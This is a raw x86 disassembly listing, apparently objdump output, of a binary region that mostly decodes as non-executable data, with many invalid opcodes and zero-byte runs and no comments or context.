  421211:	add    dh,BYTE PTR [ebx+0x73b8c]
  421217:	adc    eax,DWORD PTR [ecx+0x24]
  42121a:	or     DWORD PTR [ecx+0x23],esp
  42121d:	ins    DWORD PTR es:[edi],dx
  42121e:	in     eax,0xb1
  421220:	(bad)  
  421221:	lea    ecx,[bp+di]
  421224:	lahf   
  421225:	jge    0x4211f6
  421227:	inc    esp
  421228:	mov    ?,ebp
  42122a:	loop   0x42126b
  42122c:	and    al,0x78
  42122e:	ds xchg esp,eax
  421230:	mov    cl,0xca
  421232:	outs   dx,BYTE PTR ds:[esi]
  421233:	mov    al,0x28
  421235:	mov    BYTE PTR [eax],al
  421237:	daa    
  421238:	scas   al,BYTE PTR es:[edi]
  421239:	sbb    BYTE PTR [edx-0x195d6174],0xa2
  421240:	sub    al,0x21
  421242:	test   BYTE PTR [ecx],bl
  421244:	jp     0x4211cd
  421246:	(bad)  
  421247:	xchg   esi,eax
  421248:	in     eax,dx
  421249:	lea    ebx,[esi-0x43f036c1]
  42124f:	push   eax
  421250:	push   ebp
  421251:	(bad)  
  421253:	add    BYTE PTR [eax],al
  421255:	add    BYTE PTR [eax],al
  421257:	add    BYTE PTR [eax],al
  421259:	add    BYTE PTR [edi],bl
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2+0x319fb685],0xff
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	popa   
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR [esi-0x2aefe74f],bh
  421277:	outs   dx,BYTE PTR ds:[esi]
  421278:	js     0x421271
  42127a:	fadd   DWORD PTR [ebx]
  42127c:	stos   BYTE PTR es:[edi],al
  42127d:	pop    edi
  42127e:	aas    
  42127f:	ret    
  421280:	lds    edi,FWORD PTR [eax+0x7aa60679]
  421286:	jl     0x421253
  421288:	loopne 0x421227
  42128a:	sub    al,0x55
  42128c:	inc    ecx
  42128d:	in     eax,0xe
  42128f:	dec    ebx
  421290:	rol    esi,1
  421292:	pusha  
  421293:	bound  edi,QWORD PTR [eax+ebx*1+0x303508a0]
  42129a:	mov    cl,0xb5
  42129c:	or     edi,ebx
  42129e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42129f:	test   al,0x6a
  4212a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a2:	mov    edx,0x16559ebf
  4212a7:	cmc    
  4212a8:	lahf   
  4212a9:	inc    ecx
  4212aa:	mov    bh,0x6
  4212ac:	jne    0x4212da
  4212ae:	sbb    al,0x39
  4212b0:	mov    ds:0x3e422ebc,al
  4212b5:	aas    
  4212b6:	adc    eax,DWORD PTR [ebx+0x69]
  4212b9:	bound  eax,QWORD PTR [esi+0xa]
  4212bc:	cmp    DWORD PTR [edx-0x49],esp
  4212bf:	jnp    0x4212b7
  4212c1:	dec    ebx
  4212c2:	idiv   BYTE PTR [esi]
  4212c4:	(bad)  
  4212c5:	enter  0x4a5b,0x2d
  4212c9:	cmp    al,0x7b
  4212cb:	loopne 0x42124d
  4212cd:	push   eax
  4212ce:	ins    DWORD PTR es:[edi],dx
  4212cf:	sbb    BYTE PTR [esi+eax*8+0x5d],dh
  4212d6:	add    BYTE PTR [eax],al
  4212d8:	add    BYTE PTR [eax],al
  4212da:	das    
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	and    dh,dl
  4212e8:	outs   dx,BYTE PTR ds:[esi]
  4212e9:	jns    0x42134b
  4212eb:	int    0x1
  4212ed:	add    BYTE PTR [ecx+0x0],ah
  4212f0:	add    BYTE PTR [eax],al
  4212f2:	in     eax,0xf0
  4212f4:	and    eax,0x234ca16
  4212f9:	cmp    dl,BYTE PTR [esi]
  4212fb:	push   edi
  4212fc:	outs   dx,DWORD PTR ds:[esi]
  4212fd:	add    al,0xad
  4212ff:	arpl   WORD PTR [esi+0x47],dx
  421302:	dec    esi
  421303:	outs   dx,BYTE PTR ds:[esi]
  421304:	push   ecx
  421305:	xlat   BYTE PTR ds:[ebx]
  421306:	inc    edi
  421307:	(bad)  
  421308:	xchg   ebx,eax
  421309:	inc    ecx
  42130a:	dec    ebx
  42130b:	adc    bl,BYTE PTR [edi+eax*2-0x4e80bee5]
  421312:	dec    esi
  421313:	jl     0x421388
  421315:	lds    edx,FWORD PTR [ebx-0x4df171e8]
  42131b:	mov    DWORD PTR [edi+0x17],ebx
  42131e:	push   edx
  42131f:	loop   0x4212b9
  421321:	fidivr DWORD PTR [edx+0x7ea9d624]
  421327:	bound  ebp,QWORD PTR [edi-0x1e]
  42132a:	jecxz  0x42130c
  42132c:	xchg   ebx,eax
  42132d:	pop    eax
  42132e:	inc    esi
  42132f:	arpl   WORD PTR [esi-0x10],sp
  421332:	and    al,0xc
  421334:	idiv   BYTE PTR [esp+edi*2+0x49]
  421338:	push   es
  421339:	in     al,dx
  42133a:	daa    
  42133b:	retf   
  42133c:	and    eax,edi
  42133e:	mov    ecx,0xd8a2717a
  421343:	test   DWORD PTR [esi],0xab3cd8cb
  421349:	mov    ds:0x6f20d3a5,eax
  42134e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42134f:	shl    DWORD PTR [ebp+0x73],0x41
  421353:	add    BYTE PTR [eax],al
  421355:	add    BYTE PTR [eax],al
  421357:	add    BYTE PTR [eax],al
  421359:	add    dl,cl
  42135b:	mov    al,ds:0xdf7e4d76
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0x4f3ca49e,al
  42136a:	ror    ebp,0x1
  42136d:	add    BYTE PTR [ecx+0x0],ah
  421370:	add    BYTE PTR [eax],al
  421372:	sub    esi,DWORD PTR [eax]
  421374:	addr16 pop ebx
  421376:	pop    ebx
  421377:	ins    DWORD PTR es:[edi],dx
  421378:	adc    ecx,DWORD PTR [eax+0x61]
  42137b:	and    al,0xe5
  42137d:	js     0x4213a1
  42137f:	ror    DWORD PTR [eax-0x4f],cl
  421382:	popa   
  421383:	sbb    bl,bh
  421385:	test   eax,0xcd5424ba
  42138a:	jg     0x421376
  42138c:	outs   dx,BYTE PTR ds:[esi]
  42138d:	cmp    DWORD PTR [ecx-0x6b3e78f9],ebx
  421393:	ret    
  421394:	rcl    esp,0xde
  421397:	xchg   edx,eax
  421398:	push   cs
  421399:	fcomp  DWORD PTR [ecx-0x2aa24b1e]
  42139f:	arpl   WORD PTR [esi-0x4],bx
  4213a2:	clc    
  4213a3:	cwde   
  4213a4:	xchg   DWORD PTR [esi+0x55],esp
  4213a7:	mov    ch,0x65
  4213a9:	(bad)  
  4213aa:	cmp    eax,0xad2024d7
  4213af:	iret   
  4213b0:	test   BYTE PTR [edi-0x7c],dl
  4213b3:	pop    ds
  4213b4:	inc    edi
  4213b5:	dec    eax
  4213b6:	jmp    DWORD PTR [ebx-0x5b]
  4213b9:	mov    ah,cl
  4213bb:	pop    ecx
  4213bc:	inc    esp
  4213bd:	aam    0x5e
  4213bf:	or     al,0xb4
  4213c1:	out    dx,eax
  4213c2:	lds    edx,FWORD PTR [esi]
  4213c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c5:	push   0x1ef47764
  4213ca:	push   ecx
  4213cb:	push   ecx
  4213cc:	inc    ebx
  4213cd:	sbb    BYTE PTR ds:[ebx],dh
  4213d0:	add    al,0xd8
  4213d2:	icebp  
  4213d3:	add    BYTE PTR [eax],al
  4213d5:	add    BYTE PTR [eax],al
  4213d7:	add    BYTE PTR [eax],al
  4213d9:	add    dh,al
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	hlt    
  4213e7:	pop    es
  4213e8:	pushf  
  4213e9:	aam    0x22
  4213eb:	into   
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	popa   
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    BYTE PTR [ecx-0x5e],dl
  4213f4:	out    dx,eax
  4213f5:	adc    DWORD PTR [edx+0x2f86fa77],ecx
  4213fb:	inc    ebx
  4213fc:	pop    ebp
  4213fd:	xchg   ecx,eax
  4213fe:	retf   
  4213ff:	retf   0x971d
  421402:	int    0x48
  421404:	ins    BYTE PTR es:[edi],dx
  421405:	fcomi  st,st(5)
  421407:	cdq    
  421408:	popa   
  421409:	jmp    0xae80:0x72d14a1c
  421410:	add    eax,0x1d9040cc
  421415:	lods   al,BYTE PTR ds:[esi]
  421416:	sbb    ah,cl
  421418:	xor    ecx,ebx
  42141a:	ja     0x421401
  42141c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42141d:	sub    esp,DWORD PTR [ebp+edx*4+0x3a931033]
  421424:	inc    ebx
  421425:	xchg   ebx,eax
  421426:	pop    esi
  421427:	shl    DWORD PTR [ebx],cl
  421429:	out    dx,al
  42142a:	xor    ebp,DWORD PTR ds:0x5eef0c23
  421430:	loopne 0x42141e
  421432:	cld    
  421433:	jp     0x421424
  421435:	loope  0x42145f
  421437:	in     eax,0xfa
  421439:	mov    edi,0xed4e5e92
  42143e:	cmp    BYTE PTR [eax],bl
  421440:	ins    DWORD PTR es:[edi],dx
  421441:	jg     0x42148f
  421443:	pop    edx
  421444:	lods   eax,DWORD PTR ds:[esi]
  421445:	rcl    DWORD PTR [ecx],1
  421447:	int    0xda
  421449:	and    al,0xc
  42144b:	or     DWORD PTR [esp+edx*4-0x26],0x36
  421450:	adc    eax,ebx
  421452:	pop    esi
  421453:	add    BYTE PTR [eax],al
  421455:	add    BYTE PTR [eax],al
  421457:	add    BYTE PTR [eax],al
  421459:	add    BYTE PTR [edx+0x34],dl
  42145c:	inc    eax
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0x926a4e09
  421467:	mov    cl,0x8c
  421469:	popf   
  42146a:	or     esi,0x1
  42146d:	add    BYTE PTR [ecx+0x0],ah
  421470:	add    BYTE PTR [eax],al
  421472:	jp     0x4214dc
  421474:	pop    es
  421475:	ds aam 0x5c
  421478:	jge    0x421451
  42147a:	push   cs
  42147b:	iret   
  42147c:	sbb    DWORD PTR [eiz*2+0x657b5582],esp
  421483:	(bad)  
  421484:	pop    ebx
  421485:	ror    DWORD PTR [ecx-0x24],cl
  421488:	sub    cl,0x4e
  42148b:	push   ss
  42148c:	adc    eax,0xd325f0d0
  421491:	jg     0x421512
  421493:	mov    eax,ds:0xd112949b
  421498:	add    DWORD PTR [edx-0x21],edi
  42149b:	mov    ecx,0xe6818ce7
  4214a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a1:	sahf   
  4214a2:	outs   dx,BYTE PTR ds:[esi]
  4214a3:	mov    eax,ds:0xcebe2d67
  4214a8:	xchg   edx,eax
  4214a9:	dec    edx
  4214aa:	mov    WORD PTR [edx+0x4f],?
  4214ad:	push   edi
  4214ae:	ret    
  4214af:	(bad)  
  4214b0:	stos   DWORD PTR es:[edi],eax
  4214b1:	dec    edx
  4214b2:	jge    0x4214ba
  4214b4:	imul   eax,DWORD PTR [esi+esi*4-0x45],0x558d8290
  4214bc:	sbb    ebx,DWORD PTR [edx-0x1b7c1792]
  4214c2:	(bad)
  4214c7:	mov    WORD PTR ds:0x84275317,ds
  4214cd:	jns    0x4214f6
  4214cf:	pop    edx
  4214d0:	xchg   edx,eax
  4214d1:	in     al,dx
  4214d2:	data16 add BYTE PTR [eax],al
  4214d5:	add    BYTE PTR [eax],al
  4214d7:	add    BYTE PTR [eax],al
  4214d9:	add    BYTE PTR [edx],dl
  4214db:	mov    edx,0xe6f8c6d8
  4214e0:	push   ds
  4214e1:	(bad)  
  4214e2:	adc    bl,dh
  4214e4:	cwde   
  4214e5:	out    dx,al
  4214e6:	push   edx
  4214e7:	sub    BYTE PTR [ebx],ch
  4214e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214ea:	adc    al,0xe1
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	popa   
  4214ef:	add    BYTE PTR [eax],al
  4214f1:	add    BYTE PTR [ebx-0x1d],ah
  4214f4:	xor    DWORD PTR [ecx+esi*2-0x156735e6],ebx
  4214fb:	in     al,dx
  4214fc:	mov    ?,WORD PTR [ebx+edi*1-0x61]
  421500:	mov    al,ds:0xac0cf73
  421505:	imul   BYTE PTR [ecx]
  421507:	xor    al,0x76
  421509:	xchg   BYTE PTR [edi*1+0x6d05af7d],bh
  421510:	(bad)  
  421511:	leave  
  421512:	fs cs retf 0xb5a2
  421517:	imul   ebp,DWORD PTR [edx+0x13],0x712d9950
  42151e:	pusha  
  42151f:	jmp    0x4807:0xe9d3f58b
  421526:	lds    ecx,FWORD PTR [eax-0x38]
  421529:	or     esi,DWORD PTR [ebx-0x1f]
  42152c:	loopne 0x421543
  42152e:	sub    ebx,DWORD PTR [edi+0x70]
  421531:	les    esi,FWORD PTR [esi-0x10]
  421534:	sbb    eax,0xd5e53f02
  421539:	arpl   WORD PTR [ebx+0x30],ax
  42153c:	adc    DWORD PTR [edi+ecx*2+0x530b0073],edi
  421543:	dec    edi
  421544:	jg     0x421522
  421546:	pop    ds
  421547:	add    eax,0x48ed6c3f
  42154c:	push   ss
  42154d:	loope  0x421583
  42154f:	pop    ecx
  421550:	aas    
  421551:	xlat   BYTE PTR ds:[ebx]
  421552:	inc    esp
  421553:	add    BYTE PTR [eax],al
  421555:	add    BYTE PTR [eax],al
  421557:	add    BYTE PTR [eax],al
  421559:	add    BYTE PTR [ecx+0x46],cl
  42155c:	sub    BYTE PTR [eax],dh
  42155e:	das    
  42155f:	jle    0x4215ba
  421561:	jg     0x421529
  421563:	imul   esi,eax,0xffffffd5
  421566:	cmp    al,0x4e
  421568:	gs pop es
  42156a:	jne    0x42154d
  42156c:	add    DWORD PTR [eax],eax
  42156e:	popa   
  42156f:	add    BYTE PTR [eax],al
  421571:	add    BYTE PTR [edi],ah
  421573:	stc    
  421574:	jg     0x421560
  421576:	addr16 loope 0x421562
  421579:	add    ch,dl
  42157b:	jbe    0x4215c2
  42157d:	inc    edi
  42157e:	sbb    eax,0x7710864c
  421583:	mov    edx,0x3fb3c163
  421588:	and    cl,BYTE PTR [edi]
  42158a:	scas   eax,DWORD PTR es:[edi]
  42158b:	gs mov ebx,0xc955a700
  421591:	inc    esi
  421592:	les    edi,FWORD PTR [edx+0x6779036d]
  421598:	or     eax,0xd331d23a
  42159d:	add    DWORD PTR [ecx+0x2],0xffffffcf
  4215a1:	(bad)  
  4215a2:	out    0xcf,eax
  4215a4:	loope  0x421579
  4215a6:	push   cs
  4215a7:	jbe    0x4215c3
  4215a9:	stos   BYTE PTR es:[edi],al
  4215aa:	add    ecx,DWORD PTR [esi+0x2159184d]
  4215b0:	jl     0x4215c1
  4215b2:	lea    ebx,[eax-0x49e404ae]
  4215b8:	fist   WORD PTR [edi+0x55]
  4215bb:	outs   dx,BYTE PTR ds:[esi]
  4215bc:	add    al,0xcf
  4215be:	jl     0x42155f
  4215c0:	pop    edx
  4215c1:	sub    dl,BYTE PTR [ebx+ebx*2+0x1a1ba525]
  4215c8:	xchg   ecx,eax
  4215c9:	ficomp DWORD PTR [edi]
  4215cb:	xchg   esp,eax
  4215cc:	ret    
  4215cd:	fmul   QWORD PTR [ecx+0x76]
  4215d0:	xor    eax,0xb49a
  4215d5:	add    BYTE PTR [eax],al
  4215d7:	add    BYTE PTR [eax],al
  4215d9:	add    BYTE PTR [edi-0x3a],ah
  4215dc:	and    dh,dh
  4215de:	mov    eax,ds:0xe7d7f7f6
  4215e3:	mov    eax,0x1bfada72
  4215e8:	loopne 0x4215fe
  4215ea:	(bad)  
  4215eb:	loope  0x4215ee
  4215ed:	add    BYTE PTR [ecx+0x0],ah
  4215f0:	add    BYTE PTR [eax],al
  4215f2:	pop    ecx
  4215f3:	sub    BYTE PTR [ecx],dl
  4215f5:	pop    ecx
  4215f6:	int3   
  4215f7:	pop    ds
  4215f8:	dec    ebp
  4215f9:	mov    ds:0x5a640110,eax
  4215fe:	xchg   ecx,eax
  4215ff:	jmp    0xa4cd:0x7028277d
  421606:	loopne 0x421685
  421608:	test   eax,0xb605d5a5
  42160d:	inc    ebx
  42160e:	mov    WORD PTR [ecx],ds
  421610:	scas   eax,DWORD PTR es:[edi]
  421611:	mov    ebp,?
  421613:	aam    0xfd
  421615:	rcl    BYTE PTR [eax-0x3e31dc51],1
  42161b:	popf   
  42161c:	mov    DWORD PTR [esi],ebx
  42161e:	inc    ebp
  42161f:	dec    ebx
  421620:	dec    esi
  421621:	sub    esp,DWORD PTR [ecx]
  421623:	add    eax,0x5ed705e3
  421628:	dec    eax
  421629:	call   0x58f9:0xc41b271d
  421630:	dec    ecx
  421631:	add    ah,0xd1
  421634:	add    BYTE PTR [eax],dl
  421636:	xchg   esi,eax
  421637:	or     ecx,DWORD PTR [edi+0x8b9a2e3]
  42163d:	pop    es
  42163e:	in     al,0x7
  421640:	pop    edx
  421641:	jmp    0x421699
  421643:	into   
  421644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421645:	imul   edi,DWORD PTR [eax+0xd17d60],0xffffff8f
  42164c:	push   edi
  42164d:	fs mov bl,0xe6
  421650:	dec    ebx
  421651:	fimul  WORD PTR [esi+0x0]
  421657:	add    BYTE PTR [eax],al
  421659:	add    bl,al
  42165b:	or     eax,0xefee66a6
  421660:	ret    
  421661:	lods   eax,DWORD PTR ds:[esi]
  421662:	sub    al,0xb8
  421664:	mov    ds:0x1712e647,eax
  421669:	push   ecx
  42166a:	aaa    
  42166b:	loop   0x42166e
  42166d:	add    BYTE PTR [ecx+0x0],ah
  421670:	add    BYTE PTR [eax],al
  421672:	ins    BYTE PTR es:[edi],dx
  421673:	inc    ecx
  421674:	and    ebx,DWORD PTR [ecx]
  421676:	dec    eax
  421677:	daa    
  421678:	inc    edi
  421679:	inc    eax
  42167a:	scas   eax,DWORD PTR es:[edi]
  42167b:	sub    BYTE PTR [esi+0x17c25048],cl
  421681:	into   
  421682:	popf   
  421683:	jns    0x4216c3
  421685:	pop    DWORD PTR [edi]
  421687:	dec    eax
  421688:	lods   eax,DWORD PTR ds:[esi]
  421689:	mov    dl,0x35
  42168b:	xor    ch,BYTE PTR [ebp-0x42]
  42168e:	and    ecx,DWORD PTR ds:0x44925398
  421694:	jle    0x421682
  421696:	test   DWORD PTR [ebp-0x10],0x24890bf3
  42169d:	popf   
  42169e:	sub    DWORD PTR [eax-0x5e6ab8e5],edx
  4216a4:	jnp    0x42169b
  4216a6:	dec    ebx
  4216a7:	imul   edx,DWORD PTR [eax],0xedd08175
  4216ad:	jmp    0xc3a8451e
  4216b2:	pushf  
  4216b3:	aaa    
  4216b4:	daa    
  4216b5:	loop   0x42167a
  4216b7:	cdq    
  4216b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216b9:	data16 (bad) 
  4216bb:	cmc    
  4216bc:	jns    0x421649
  4216be:	inc    edi
  4216bf:	cmp    al,0x79
  4216c1:	sbb    cl,BYTE PTR ds:0xc06bb55f
  4216c7:	sbb    bl,bh
  4216c9:	bound  esp,QWORD PTR cs:[ebx+0x4b]
  4216cd:	in     al,dx
  4216ce:	fs sbb ah,ah
  4216d1:	sub    esi,DWORD PTR [edi]
  4216d3:	add    BYTE PTR [eax],al
  4216d5:	add    BYTE PTR [eax],al
  4216d7:	add    BYTE PTR [eax],al
  4216d9:	add    cl,bl
  4216db:	ret    0x4905
  4216de:	pop    ds
  4216df:	iret   
  4216e0:	fst    st(2)
  4216e2:	enter  0xf86f,0xd2
  4216e6:	xor    BYTE PTR [edx+0x31],bl
  4216e9:	icebp  
  4216ea:	cwde   
  4216eb:	loop   0x4216ee
  4216ed:	add    BYTE PTR [ecx+0x0],dl
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	push   ds
  4216f3:	pop    es
  4216f4:	bound  edx,QWORD PTR ds:0xcf8ca2c
  4216fa:	mov    esp,0x741ebec3
  4216ff:	and    ah,BYTE PTR [edx+0x12]
  421702:	push   es
  421703:	stos   BYTE PTR es:[edi],al
  421704:	clc    
  421705:	cmp    ecx,eax
  421707:	(bad)  
  421708:	(bad)  
  421709:	lock xchg esp,eax
  42170b:	xchg   esi,eax
  42170c:	pushf  
  42170d:	or     BYTE PTR [esi],bl
  42170f:	out    0x58,eax
  421711:	xchg   BYTE PTR [ebx+0x6d],dh
  421714:	lods   eax,DWORD PTR ds:[esi]
  421715:	cld    
  421716:	daa    
  421717:	push   esi
  421718:	inc    ebp
  421719:	inc    ebp
  42171a:	inc    BYTE PTR [edi+edi*1+0x8]
  42171e:	or     DWORD PTR [ebx-0x76bb8fda],esi
  421724:	mov    ecx,0x8d804764
  421729:	dec    ecx
  42172a:	arpl   cx,dx
  42172c:	fcomp  DWORD PTR [edi]
  42172e:	push   ecx
  42172f:	inc    edx
  421730:	jmp    0x166d:0x180a3463
  421737:	inc    ebp
  421738:	xchg   ebp,eax
  421739:	pop    ds
  42173a:	fdivr  DWORD PTR [ebx+0x78a6cdb]
  421740:	sbb    DWORD PTR [ecx+ecx*1+0x0],eax
  421744:	add    BYTE PTR [eax],al
  421746:	add    BYTE PTR [eax],al
  421748:	add    BYTE PTR [eax],al
  42174a:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],cl
  421753:	nop
  421754:	inc    edx
  421755:	add    BYTE PTR [eax+edx*4],cl
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],dl
  42175b:	nop
  42175c:	inc    edx
  42175d:	add    BYTE PTR [eax+edx*4],dl
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],bl
  421763:	nop
  421764:	inc    edx
  421765:	add    BYTE PTR [eax+edx*4],bl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax],al
  42176b:	mov    al,ds:0xa0040042
  421770:	inc    edx
  421771:	add    BYTE PTR [eax],cl
  421773:	mov    al,ds:0xa00c0042
  421778:	inc    edx
  421779:	add    BYTE PTR [eax],dl
  42177b:	mov    al,ds:0xa0140042
  421780:	inc    edx
  421781:	add    BYTE PTR [eax],bl
  421783:	mov    al,ds:0xa01c0042
  421788:	inc    edx
  421789:	add    BYTE PTR [eax],al
  42178b:	mov    al,0x42
  42178d:	add    BYTE PTR [eax+esi*4],al
  421790:	inc    edx
  421791:	add    BYTE PTR [eax],cl
  421793:	mov    al,0x42
  421795:	add    BYTE PTR [eax+esi*4],cl
  421798:	inc    edx
  421799:	add    BYTE PTR [eax],dl
  42179b:	mov    al,0x42
  42179d:	add    BYTE PTR [eax+esi*4],dl
  4217a0:	inc    edx
  4217a1:	add    BYTE PTR [eax],bl
  4217a3:	mov    al,0x42
  4217a5:	add    BYTE PTR [eax+esi*4],bl
  4217a8:	inc    edx
  4217a9:	add    BYTE PTR [eax+0x66],bh
  4217ac:	ins    BYTE PTR es:[edi],dx
  4217ad:	jp     0x421806
  4217af:	jbe    0x4217f8
  4217b1:	ja     0x4217f6
  4217b3:	js     0x4217fd
  4217b5:	jno    0x42181a
  4217b7:	inc    edx
  4217b8:	inc    bx
  4217ba:	push   ebp
  4217bb:	jno    0x421833
  4217bd:	ja     0x421826
  4217bf:	dec    edi
  4217c0:	dec    esp
  4217c1:	dec    ebp
  4217c2:	inc    edx
  4217c3:	jno    0x421836
  4217c5:	jae    0x42181a
  4217c7:	push   eax
  4217c8:	arpl   WORD PTR [ebx+0x72],dx
  4217cb:	sbb    eax,DWORD PTR [edx+0x0]
  4217ce:	jp     0x4217eb
  4217d0:	inc    edx
  4217d1:	add    BYTE PTR [edx],dl
  4217d3:	sbb    al,BYTE PTR [edx+0x0]
  4217d6:	out    dx,eax
  4217d7:	or     esi,DWORD PTR [edx+0x304e790e]
  4217dd:	dec    esi
  4217de:	xchg   DWORD PTR [edi+0x3d],ecx
  4217e1:	dec    esi
  4217e2:	scas   eax,DWORD PTR es:[edi]
  4217e3:	dec    edi
  4217e4:	ds dec esi
  4217e6:	js     0x421836
  4217e8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217eb:	dec    edi
  4217ec:	inc    esp
  4217ed:	dec    esi
  4217ee:	jae    0x42183e
  4217f0:	inc    ecx
  4217f1:	dec    esi
  4217f2:	xor    BYTE PTR [esi+0x40],cl
  4217f5:	dec    esi
  4217f6:	pop    esp
  4217f7:	pop    ebp
  4217f8:	pop    edi
  4217f9:	push   edx
  4217fa:	cmp    DWORD PTR [esi+0x79],ecx
  4217fd:	dec    esi
  4217fe:	xor    BYTE PTR [esi-0x79],cl
  421801:	dec    edi
  421802:	cmp    eax,0x3e4faf4e
  421807:	dec    esi
  421808:	js     0x421858
  42180a:	cmp    ecx,DWORD PTR [esi-0x64]
  42180d:	dec    edi
  42180e:	inc    esp
  42180f:	dec    esi
  421810:	mov    DWORD PTR [edi+0x41],ecx
  421813:	dec    esi
  421814:	xor    BYTE PTR [esi+0x40],cl
  421817:	dec    esi
  421818:	pop    esp
  421819:	ins    DWORD PTR es:[edi],dx
  42181a:	pop    edi
  42181b:	bound  edi,QWORD PTR [ecx]
  42181d:	dec    esi
  42181e:	jns    0x42186e
  421820:	xor    BYTE PTR [esi-0x80],cl
  421823:	dec    edi
  421824:	cmp    eax,0x394e734e
  421829:	dec    esi
  42182a:	mov    ds:0x304e3a4f,al
  42182f:	dec    esi
  421830:	inc    esi
  421831:	dec    esi
  421832:	pop    esp
  421833:	jge    0x421894
  421835:	jb     0x4218a6
  421837:	sub    BYTE PTR [esi-0x7d],0x7e
  42183b:	xchg   ebx,eax
  42183c:	jns    0x4217ce
  42183e:	aas    
  42183f:	dec    esi
  421840:	test   BYTE PTR [edi+0x30],cl
  421843:	dec    esi
  421844:	test   BYTE PTR [edi+0x3c],cl
  421847:	dec    esi
  421848:	mov    ds:0x734e394f,al
  42184d:	dec    esi
  42184e:	inc    ebp
  42184f:	dec    esi
  421850:	xor    BYTE PTR [esi+0x44],cl
  421853:	dec    esi
  421854:	pop    esp
  421855:	lea    ebx,[edi-0x7e]
  421858:	outs   dx,DWORD PTR ds:[esi]
  421859:	xchg   edx,eax
  42185a:	outs   dx,BYTE PTR ds:[esi]
  42185b:	xchg   ebx,eax
  42185c:	jle    0x421801
  42185e:	jns    0x421800
  421860:	aas    
  421861:	dec    esi
  421862:	test   BYTE PTR [edi+0x30],cl
  421865:	dec    esi
  421866:	test   BYTE PTR [edi+0x3c],cl
  421869:	dec    esi
  42186a:	mov    ds:0x894e394f,al
  42186f:	dec    edi
  421870:	inc    ebp
  421871:	dec    esi
  421872:	xor    BYTE PTR [esi+0x44],cl
  421875:	dec    esi
  421876:	pop    esp
  421877:	popf   
  421878:	pop    edi
  421879:	xchg   edx,eax
  42187a:	outs   dx,DWORD PTR ds:[esi]
  42187b:	mov    ds:0xb37ea36e,al
  421880:	jns    0x421832
  421882:	aas    
  421883:	dec    esi
  421884:	mov    cs,WORD PTR [edi+0x30]
  421887:	dec    esi
  421888:	lods   al,BYTE PTR ds:[esi]
  421889:	dec    edi
  42188a:	cmp    eax,0x394e734e
  42188f:	dec    esi
  421890:	mov    eax,ds:0x304e3a4f
  421895:	dec    esi
  421896:	inc    esp
  421897:	dec    esi
  421898:	pop    esp
  421899:	lods   eax,DWORD PTR ds:[esi]
  42189a:	pop    edi
  42189b:	mov    ds:0xb36eb26f,al
  4218a0:	jle    0x421865
  4218a2:	jns    0x421864
  4218a4:	aas    
  4218a5:	dec    esi
  4218a6:	mov    cs,WORD PTR [edi+0x30]
  4218a9:	dec    esi
  4218aa:	lods   al,BYTE PTR ds:[esi]
  4218ab:	dec    edi
  4218ac:	cmp    eax,0x394e7e4e
  4218b1:	dec    esi
  4218b2:	lahf   
  4218b3:	dec    edi
  4218b4:	cmp    ecx,DWORD PTR [esi+0x30]
  4218b7:	dec    esi
  4218b8:	inc    ebp
  4218b9:	dec    esi
  4218ba:	pop    esp
  4218bb:	mov    ebp,0xc26fb25f
  4218c0:	outs   dx,BYTE PTR ds:[esi]
  4218c1:	ret    
  4218c2:	jle    0x421897
  4218c4:	jns    0x421896
  4218c6:	aas    
  4218c7:	dec    esi
  4218c8:	mov    cs,WORD PTR [edi+0x30]
  4218cb:	dec    esi
  4218cc:	lods   al,BYTE PTR ds:[esi]
  4218cd:	dec    edi
  4218ce:	cmp    eax,0x394f804e
  4218d3:	dec    esi
  4218d4:	lods   al,BYTE PTR ds:[esi]
  4218d5:	dec    edi
  4218d6:	cmp    cl,BYTE PTR [esi+0x30]
  4218d9:	dec    esi
  4218da:	inc    esi
  4218db:	dec    esi
  4218dc:	pop    esp
  4218dd:	int    0x5f
  4218df:	ret    0xd26f
  4218e2:	outs   dx,BYTE PTR ds:[esi]
  4218e3:	sar    DWORD PTR [esi-0x1d],cl
  4218e6:	jns    0x4218c8
  4218e8:	aas    
  4218e9:	dec    esi
  4218ea:	mov    cs,WORD PTR [edi+0x30]
  4218ed:	dec    esi
  4218ee:	lods   al,BYTE PTR ds:[esi]
  4218ef:	dec    edi
  4218f0:	cmp    eax,0x394f834e
  4218f5:	dec    esi
  4218f6:	mov    ds:0x304e3a4f,al
  4218fb:	dec    esi
  4218fc:	inc    esp
  4218fd:	dec    esi
  4218fe:	pop    esp
  4218ff:	fstp   QWORD PTR [edi-0x2e]
  421902:	outs   dx,DWORD PTR ds:[esi]
  421903:	loop   0x421973
  421905:	jecxz  0x421985
  421907:	repz jns 0x4218fa
  42190a:	aas    
  42190b:	dec    esi
